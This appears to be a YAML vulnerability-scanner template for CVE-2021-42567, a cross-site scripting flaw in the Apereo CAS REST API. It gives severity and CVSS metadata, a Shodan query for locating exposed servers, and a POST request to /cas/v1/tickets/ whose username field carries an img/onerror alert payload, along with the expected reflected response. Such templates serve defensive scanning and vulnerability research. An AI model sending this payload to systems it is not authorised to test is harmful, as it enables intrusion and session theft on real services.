id: CVE-2021-42567
info:
  name: Apereo CAS Cross-Site Scripting
  author: pdteam
  description: Apereo CAS through 6.4.1 allows cross-site scripting via POST requests
    sent to the REST API endpoints.
  severity: medium
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute malicious scripts in the context of a victim''s browser, potentially leading
    to session hijacking, data theft, or defacement.

    '
  remediation: 'Apply the latest security patches or updates provided by the vendor
    to mitigate this vulnerability.

    '
  reference:
  - https://apereo.github.io/2021/10/18/restvuln/
  - https://www.sudokaikan.com/2021/12/exploit-cve-2021-42567-post-based-xss.html
  - https://github.com/sudohyak/exploit/blob/dcf04f704895fe7e042a0cfe9c5ead07797333cc/CVE-2021-42567/README.md
  - https://nvd.nist.gov/vuln/detail/CVE-2021-42567
  - https://github.com/apereo/cas/releases
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2021-42567
    cwe-id: CWE-79
    epss-score: 0.25981
    epss-percentile: 0.96613
    cpe: cpe:2.3:a:apereo:central_authentication_service:*:*:*:*:*:*:*:*
  metadata:
    max-request: 1
    vendor: apereo
    product: central_authentication_service
    shodan-query: http.title:'CAS - Central Authentication Service'
  tags: cve2021,cve,apereo,xss,cas
traps:
- request:
    method: POST
    path: /cas/v1/tickets/
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: 'username=%3Cimg%2Fsrc%2Fonerror%3Dalert%28document.domain%29%3E&password=test

      '
  response:
    status_code: 401
    headers: {}
    body: <img/src/onerror=alert(document.domain)>java.util.HashMap
